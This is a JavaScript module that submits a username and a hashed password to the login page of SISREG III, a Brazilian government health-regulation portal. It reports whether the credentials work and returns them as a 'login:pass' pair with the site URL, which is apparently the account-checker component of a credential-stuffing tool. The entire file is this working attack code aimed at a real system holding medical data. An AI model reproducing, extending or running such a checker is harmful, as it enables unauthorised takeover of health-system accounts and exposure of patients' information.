import req from "./requests.js";
import crypto from "node:crypto";



export default async function sisregiii(login, pass) {
  let passEncrypt256 = crypto
    .createHash("sha256")
    .update(pass.toUpperCase())
    .digest("hex");

  const res = await req({
    url: "https://sisregiii.saude.gov.br/",
    method: "POST",
    data: `usuario=${login}&senha=&senha_256=${passEncrypt256}&etapa=ACESSO&logout=`,
  });

  if (
    res.includes("Login ou senha incorreto(s)") ||
    res.includes("Este operador foi desativado pelo administrador.")
  )
    return {
      success: false,
      login: login + ":" + pass,
      uri: "https://sisregiii.saude.gov.br/",
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: "https://sisregiii.saude.gov.br/",
  };
}
